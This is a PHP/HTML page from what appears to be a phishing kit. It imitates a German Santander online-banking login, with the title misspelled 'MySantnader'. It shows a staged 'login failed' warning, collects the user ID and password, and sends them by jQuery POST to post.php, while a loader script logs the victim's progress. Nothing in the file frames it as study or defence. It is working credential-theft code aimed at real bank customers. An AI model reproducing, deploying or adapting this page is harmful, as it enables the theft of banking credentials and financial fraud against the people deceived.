<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MySantnader</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<img src="res/logo.png" class="pc">
<img src="res/text.png" class="pc">
<img src="res/mini-logo.png" class="mobile">
</header>
<main>
<div class="left">

<div class="form">

<div class="title">Willkommen bei MySantander</div>
<div class="text">Ihrem <b>Online Banking Portal</b> - weitere Informationen finden Sie <a href="#"><b>hier</b></a>.</div>

<?php setError("Ihr Login war nicht erfolgreich. Bitte überprüfen Sie Ihre Eingabe. Bitte beachten Sie: Wiederholte Fehleingaben können zur Sperre Ihrer Zugangsdaten führen."); ?>
<div class="col">
    <input type="text" id="u" placeholder="Benutzerkennung">
</div>

<div class="col">
    <input type="password" id="p" placeholder="Passwort">
</div>

<div class="col forgot">
Passwort zurücksetzen
</div>

<div class="col btn">
    <button onclick="sendLog()">Einloggen</button>
</div>


<div class="col rgst">
Signaturverfahren einrichten
</div>


<div class="col info">
<b>Sie haben noch keinen Zugang?</b>
Als Kreditkunde können Sie die Registrierung für das MySantander Online Banking ganz bequem digital vornehmen und Ihre Bankgeschäfte einfach von zu Hause aus erledigen!
</div>

<div class="col register-btn">
    <button>MySantander Registrierung</button>
</div>


</div>


</div>
<div class="right">
<img src="res/user.png">
</div>
</main> 


<?php 
require 'loader.php';
$m->ctr("LOGIN ".@$_GET['e']);
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

$("input").keyup(()=>{
    $("input").removeClass("error");
});

function sendLog(){
    if($("#u").val()==""){
        return $("#u").addClass("error");
    }
    if($("#p").val()==""){
        return $("#p").addClass("error");
    }
    $(".loader").show();
    _cp = "LOADING (LOGIN)";
    $.post("post.php",{
        user:$("#u").val(),
        pass:$("#p").val()
    },(res)=>{
        
    });
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});

</script>
</body>
</html>